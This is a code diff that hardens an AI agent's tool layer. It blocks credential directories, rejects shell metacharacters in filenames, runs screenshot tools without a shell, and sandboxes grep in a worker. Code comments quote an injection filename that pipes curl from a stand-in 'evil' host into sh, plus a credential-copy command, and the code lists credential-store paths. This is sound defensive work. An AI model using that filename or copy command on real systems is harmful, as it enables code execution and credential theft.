@@ -8,7 +8,9 @@
  * anything that can mutate the machine MUST set it.
  */
 import { spawn } from "node:child_process";
-import { readFile, writeFile, readdir, stat, mkdir, open } from "node:fs/promises";
+import { Worker } from "node:worker_threads";
+import { readFile, writeFile, readdir, stat, mkdir } from "node:fs/promises";
+import { SKIP_DIRS } from "./scan.js";
 import { existsSync, realpathSync } from "node:fs";
 import { basename, dirname, isAbsolute, relative, resolve, join } from "node:path";
 import { homedir } from "node:os";
@@ -54,6 +56,37 @@ function isInside(root, target) {
   return rel === "" || (!rel.startsWith("..") && !isAbsolute(rel));
 }
 
+/**
+ * Paths that are never a workspace, whatever the workspace is.
+ *
+ * `PINCH_WORKSPACE` defaults to the home directory, so "inside the workspace"
+ * is not the same as "safe to read": ~/.ssh/id_rsa is inside $HOME. The agent
+ * has no business opening a credential store, and the one time it would is the
+ * one time it has been talked into it — by a web page, a tool output, or an
+ * attached document. Denying them here means the sandbox is about *intent*,
+ * not just geometry.
+ *
+ * A user who genuinely wants the agent in ~/.ssh can add the path to
+ * PINCH_WORKSPACE_TTL... no: they can move the workspace. Deliberate friction.
+ */
+const PROTECTED = [
+  ".ssh", ".aws", ".gnupg", ".kube", ".netrc", ".git-credentials",
+  ".npmrc", ".pypirc", ".config/gh", ".config/gcloud", ".config/pip",
+  ".docker/config.json", ".azure", "Library/Keychains",
+].map((p) => join(homedir(), p));
+
+export function isProtected(target) {
+  const real = (() => {
+    try {
+      return realpathSync(target);
+    } catch {
+      return target;
+    }
+  })();
+  return PROTECTED.some((p) => target === p || target.startsWith(p + "/") ||
+    real === p || real.startsWith(p + "/"));
+}
+
 export function resolveInWorkspace(input) {
   const raw = String(input || ".").replace(/^~(?=$|\/)/, homedir());
   const abs = isAbsolute(raw) ? resolve(raw) : resolve(config.workspaceRoots[0], raw);
@@ -65,6 +98,13 @@ export function resolveInWorkspace(input) {
   const canonical = canonicalise(abs);
   const realOk = config.workspaceRoots.some((root) => isInside(canonicalise(root), canonical));
 
+  if (isProtected(abs) || isProtected(canonical)) {
+    throw new SafePathError(
+      `Blocked: ${abs} is a credential store, not a workspace. Pinch never reads ` +
+        `~/.ssh, ~/.aws, ~/.gnupg or similar — not even when your workspace is your home directory.`
+    );
+  }
+
   if (!lexicalOk || !realOk) {
     const why = lexicalOk && !realOk ? " (a symlink points outside it)" : "";
     throw new SafePathError(
@@ -74,6 +114,35 @@ export function resolveInWorkspace(input) {
     );
   }
   return abs;
+}
+
+/**
+ * Refuse filenames that are only interesting to a shell.
+ *
+ * resolveInWorkspace answers "is this inside the workspace"; it does not and
+ * cannot answer "is this string safe to hand to another program". A name
+ * containing $(...), a backtick, a quote or a newline is legal on every
+ * filesystem and is a command waiting for a shell. Nothing Pinch writes needs
+ * those characters, so anything that uses one is refused here rather than
+ * being escaped later by whoever remembers to.
+ */
+export function checkFilename(name) {
+  if (name == null) return { ok: true };
+  const value = String(name);
+  if (value.length > 200) return { ok: false, output: "That path is too long (200 characters)." };
+  // Only the characters that change *command structure* are refused. Parentheses
+  // and braces are ordinary in filenames ("My File (2).png") and harmless once
+  // the shell is gone; `$` is what turns (2) into $(2).
+  const bad = /[`$|;&<>\n\r\0]/.test(value);
+  if (bad) {
+    return {
+      ok: false,
+      output:
+        "That path contains shell metacharacters ($ ` | ; & < > or a newline). " +
+        "Pinch will not build a command from it. Use plain letters, digits, dots, dashes, underscores and slashes.",
+    };
+  }
+  return { ok: true };
 }
 
 /* ─────────────────────────── catastrophic command guard ────────────────── */
@@ -109,11 +178,29 @@ const DENY = [
 export function describeEscapes(command) {
   const roots = config.workspaceRoots;
   const outside = new Set();
-  const candidates = String(command).match(/(?:^|[\s'"=])(\/[\w.\-+]+(?:\/[\w.\-+@]*)*)/g) || [];
+
+  // Absolute paths, plus the two forms that expand into one. The old pattern
+  // matched only `/word/...`, so `cp ~/.aws/credentials ./creds` — the exact
+  // shape of a credential exfiltration — produced no warning at all, and
+  // neither did `cd $HOME`.
+  const candidates = String(command).match(/(?:^|[\s'"=])((?:~|\$HOME|\$\{HOME\})[\w./@+-]*|\/[\w.\-+@]+(?:\/[\w.\-+@]*)*)/g) || [];
+
   for (const raw of candidates) {
-    const path = raw.trim().replace(/^[\s'"=]/, "");
+    let path = raw.trim().replace(/^[\s'"=]/, "");
+    path = path.replace(/^(~|\$HOME|\$\{HOME\})(?=$|\/)/, homedir());
+    if (!path.startsWith("/")) continue;
     if (/^\/(dev|proc|sys)\b/.test(path)) continue;
-    const inside = roots.some((root) => path === root || path.startsWith(root + "/"));
+
+    const real = (() => {
+      try {
+        return realpathSync(path);
+      } catch {
+        return path;
+      }
+    })();
+
+    const inside = roots.some((root) => path === root || path.startsWith(root + "/") ||
+      real === root || real.startsWith(root + "/"));
     if (!inside) outside.add(path);
   }
   return [...outside].slice(0, 4);
@@ -188,6 +275,64 @@ export function runShell(command, { cwd, timeoutMs = config.shellTimeoutMs } = {
       resolvePromise({ ok: code === 0 && !killed, code, stdout, stderr, killed });
     });
   });
+}
+
+/**
+ * Run one program with an argv array — no shell, ever.
+ *
+ * `runShell` exists because some things genuinely need a pipeline, and the
+ * permission prompt shows the human that exact pipeline. But any tool that has
+ * a *filename* parameter must not use it: a filename is data, and data that
+ * reaches a shell string is a command. This is the runner those tools use.
+ *
+ * @returns {Promise<{ok: boolean, stdout: string, stderr: string}>}
+ */
+export function runProgram(file, args, { timeoutMs = 15_000, env } = {}) {
+  return new Promise((resolvePromise) => {
+    let child;
+    try {
+      child = spawn(file, args, {
+        shell: false,
+        stdio: ["ignore", "pipe", "pipe"],
+        env: env || childEnv(),
+      });
+    } catch (err) {
+      return resolvePromise({ ok: false, stdout: "", stderr: String(err.message) });
+    }
+    let stdout = "";
+    let stderr = "";
+    const timer = setTimeout(() => {
+      try { child.kill("SIGKILL"); } catch {}
+    }, timeoutMs);
+
+    child.stdout?.on("data", (d) => {
+      if (stdout.length < 20_000) stdout += d.toString();
+    });
+    child.stderr?.on("data", (d) => {
+      if (stderr.length < 8_000) stderr += d.toString();
+    });
+    // ENOENT arrives as an error, not a non-zero exit — report it as "missing"
+    // so the caller can try the next candidate binary.
+    child.on("error", (err) => {
+      clearTimeout(timer);
+      resolvePromise({ ok: false, missing: err.code === "ENOENT", stdout, stderr: String(err.message) });
+    });
+    child.on("close", (code) => {
+      clearTimeout(timer);
+      resolvePromise({ ok: code === 0, code, stdout, stderr });
+    });
+  });
+}
+
+/** Try each candidate in order; the first that exists and exits 0 wins. */
+export async function runFirstAvailable(candidates, opts) {
+  const tried = [];
+  for (const [file, args] of candidates) {
+    const res = await runProgram(file, args, opts);
+    if (res.ok) return { ...res, used: file };
+    tried.push(res.missing ? `${file} (not installed)` : `${file} (${res.stderr.trim().slice(0, 120) || `exit ${res.code}`})`);
+  }
+  return { ok: false, stdout: "", stderr: tried.join("; ") || "no capture tool found" };
 }
 
 /* ──────────────────────── tiny safe math evaluator ─────────────────────── */
@@ -286,10 +431,8 @@ export function calculate(expression) {
 
 /* ────────────────────────── workspace inspection ───────────────────────── */
 
-const SKIP_DIRS = new Set([
-  "node_modules", ".git", "dist", "build", ".next", "__pycache__",
-  ".venv", "venv", ".cache", "target", "coverage", ".idea", ".DS_Store",
-]);
+/* SKIP_DIRS and the bounded reader live in scan.js, shared with the grep
+ * worker so the two can never disagree about what a workspace contains. */
 
 export async function treeSummary(root, { maxDepth = 3, maxEntries = 120 } = {}) {
   const lines = [];
@@ -301,9 +444,11 @@ export async function treeSummary(root, { maxDepth = 3, maxEntries = 120 } = {})
     } catch {
       return;
     }
+    // This was `!x === false || true`, which is always true — the intended
+    // "skip dotfiles" never happened. (.env is skipped again below, because a
+    // project tree should never advertise where the keys live.)
     entries = entries
-      .filter((e) => !SKIP_DIRS.has(e.name) && !e.name.startsWith(".") === false || true)
-      .filter((e) => !SKIP_DIRS.has(e.name))
+      .filter((e) => !SKIP_DIRS.has(e.name) && !e.name.startsWith("."))
       .sort((a, b) => Number(b.isDirectory()) - Number(a.isDirectory()) || a.name.localeCompare(b.name));
     for (const entry of entries) {
       if (lines.length >= maxEntries) return;
@@ -316,6 +461,63 @@ export async function treeSummary(root, { maxDepth = 3, maxEntries = 120 } = {})
   }
   await walk(root, 1, "");
   return lines.join("\n");
+}
+
+/* ────────────────────────────── grep worker ────────────────────────────── */
+
+/** How long a single grep may run before the thread is terminated. */
+const GREP_TIMEOUT_MS = 3_000;
+
+/**
+ * Run the scan on a worker thread and kill it if it misbehaves.
+ *
+ * Node's regex engine cannot be interrupted, so the only reliable containment
+ * is a separate thread we can terminate. The message the model gets back is
+ * actionable, because a model that has just been told "too expensive" will
+ * simplify the pattern — a model that gets silence will retry it.
+ */
+export function grepInWorker({ root, pattern, glob }, timeoutMs = GREP_TIMEOUT_MS) {
+  return new Promise((resolvePromise) => {
+    let settled = false;
+    const finish = (value) => {
+      if (settled) return;
+      settled = true;
+      clearTimeout(timer);
+      resolvePromise(value);
+    };
+
+    let worker;
+    try {
+      worker = new Worker(new URL("./grep-worker.js", import.meta.url), {
+        workerData: { root, pattern: String(pattern), glob: glob ? String(glob) : null },
+        resourceLimits: { maxOldGenerationSizeMb: 128 },
+        // Never inherit the host's flags: `node --input-type=module` in
+        // execArgv makes every Worker fail to start, and Pinch should not
+        // depend on how it was launched.
+        execArgv: [],
+      });
+    } catch (err) {
+      return resolvePromise({ ok: false, output: `grep could not start: ${err.message}` });
+    }
+
+    const timer = setTimeout(() => {
+      worker.terminate();
+      finish({
+        ok: false,
+        output:
+          `That pattern was too expensive to run (more than ${Math.round(timeoutMs / 1000)}s). ` +
+          `Avoid nested quantifiers like (a+)+ or (\\w+)* — try a simpler expression.`,
+      });
+    }, timeoutMs);
+
+    worker.on("message", (msg) => {
+      worker.terminate();
+      if (msg.ok) finish({ ok: true, output: msg.hits.join("\n") || "No matches." });
+      else finish({ ok: false, output: `grep failed: ${msg.error}` });
+    });
+    worker.on("error", (err) => finish({ ok: false, output: `grep failed: ${err.message}` }));
+    worker.on("exit", () => finish({ ok: false, output: "grep worker exited without a result." }));
+  });
 }
 
 /* ──────────────────────────────── tool defs ────────────────────────────── */
@@ -443,45 +645,11 @@ export const TOOLS = [
     },
     async run({ pattern, path, glob }) {
       const abs = resolveInWorkspace(path || ".");
-      const re = new RegExp(pattern, "i");
-      const hits = [];
-      async function walk(dir) {
-        if (hits.length >= 60) return;
-        for (const entry of await readdir(dir, { withFileTypes: true }).catch(() => [])) {
-          if (hits.length >= 60) return;
-          const full = join(dir, entry.name);
-          if (entry.isDirectory()) {
-            if (!SKIP_DIRS.has(entry.name)) await walk(full);
-          } else if (entry.isFile()) {
-            if (glob && !entry.name.endsWith(`.${glob.replace(/^\./, "")}`)) continue;
-            if (glob === undefined && /\.(png|jpe?g|gif|zip|pdf|mp4|mp3|woff2?|ico|lock)$/i.test(entry.name)) continue;
-            let text;
-            try {
-              // Open once and read a bounded prefix: no stat-then-read window,
-              // and a surprise 4 GB file cannot be pulled into memory.
-              const handle = await open(full, "r");
-              try {
-                const buf = Buffer.allocUnsafe(GREP_BYTE_CAP);
-                const { bytesRead } = await handle.read(buf, 0, GREP_BYTE_CAP, 0);
-                text = buf.subarray(0, bytesRead).toString("utf8");
-              } finally {
-                await handle.close();
-              }
-            } catch {
-              continue;
-            }
-            if (!text.includes("\u0000")) {
-              text.split("\n").forEach((line, i) => {
-                if (hits.length < 60 && re.test(line)) {
-                  hits.push(`${relative(config.workspaceRoots[0], full)}:${i + 1}: ${line.trim().slice(0, 180)}`);
-                }
-              });
-            }
-          }
-        }
-      }
-      await walk(abs);
-      return { ok: true, output: hits.join("\n") || "No matches." };
+      // The pattern is model output, so it runs on a thread the parent can
+      // kill. A catastrophic regex is then a 3-second apology to the model
+      // instead of a frozen assistant for everyone.
+      const result = await grepInWorker({ root: abs, pattern, glob });
+      return result;
     },
   },
   {
@@ -813,27 +981,57 @@ export const TOOLS = [
       properties: { path: stringProp("Optional output path (default data/screens/shot-<time>.png)") },
     },
     async run({ path }) {
+      const guard = checkFilename(path);
+      if (!guard.ok) return guard;
       const target = resolveInWorkspace(path || `screens/shot-${Date.now()}.png`);
       await mkdir(dirname(target), { recursive: true });
-      const cmd =
-        process.platform === "darwin" ? `screencapture -x "${target}"`
-        : process.platform === "win32"
-          ? `powershell -NoProfile -Command "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; ` +
-            `$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp=New-Object System.Drawing.Bitmap $b.Width,$b.Height; ` +
-            `$g=[System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size); ` +
-            `$bmp.Save('${target.replace(/\\/g, "\\\\")}')"`
-          : `(command -v gnome-screenshot >/dev/null && gnome-screenshot -f "${target}") || ` +
-            `(command -v scrot >/dev/null && scrot -o "${target}") || ` +
-            `(command -v import >/dev/null && import -window root "${target}") || ` +
-            `(command -v grim >/dev/null && grim "${target}")`;
-      const res = await runShell(cmd, { timeoutMs: 15_000 });
+
+      // No shell, and no interpolation of the path into a program.
+      //
+      // This used to be runShell(`screencapture -x "${target}"`), which looked
+      // careful and was a command injection: double quotes do not stop $(...)
+      // inside them. `resolveInWorkspace` only proves the path is inside the
+      // workspace — it says nothing about shell metacharacters, and
+      // "shot$(curl evil|sh).png" is a perfectly legal name in there.
+      //
+      // Every one of these binaries takes its argument as argv, so let them.
+      // The Windows script reads the path from the environment instead of
+      // having it pasted into the script text, for the same reason.
+      const WINDOWS_SCRIPT =
+        "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; " +
+        "$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; " +
+        "$bmp=New-Object System.Drawing.Bitmap $b.Width,$b.Height; " +
+        "$g=[System.Drawing.Graphics]::FromImage($bmp); " +
+        "$g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size); " +
+        "$bmp.Save($env:PINCH_SHOT)";
+
+      const candidates =
+        process.platform === "darwin"
+          ? [["screencapture", ["-x", target]]]
+          : process.platform === "win32"
+            ? [["powershell", ["-NoProfile", "-NonInteractive", "-Command", WINDOWS_SCRIPT]]]
+            : [
+                ["gnome-screenshot", ["-f", target]],
+                ["scrot", ["-o", target]],
+                ["import", ["-window", "root", target]],
+                ["grim", [target]],
+              ];
+
+      const res = await runFirstAvailable(candidates, {
+        timeoutMs: 15_000,
+        env: process.platform === "win32" ? { ...childEnv(), PINCH_SHOT: target } : childEnv(),
+      });
+
       if (!res.ok) {
         return {
           ok: false,
           output:
-            `Could not take a screenshot (${res.stderr.trim() || "no capture tool found"}). ` +
+            `Could not take a screenshot (${String(res.stderr || "").trim() || "no capture tool found"}). ` +
             `On Linux install gnome-screenshot, scrot, imagemagick or grim.`,
         };
+      }
+      if (!existsSync(target)) {
+        return { ok: false, output: `${res.used} reported success but wrote nothing to the target path.` };
       }
       return { ok: true, output: `Screenshot saved to ${relative(config.workspaceRoots[0], target) || target}` };
     },
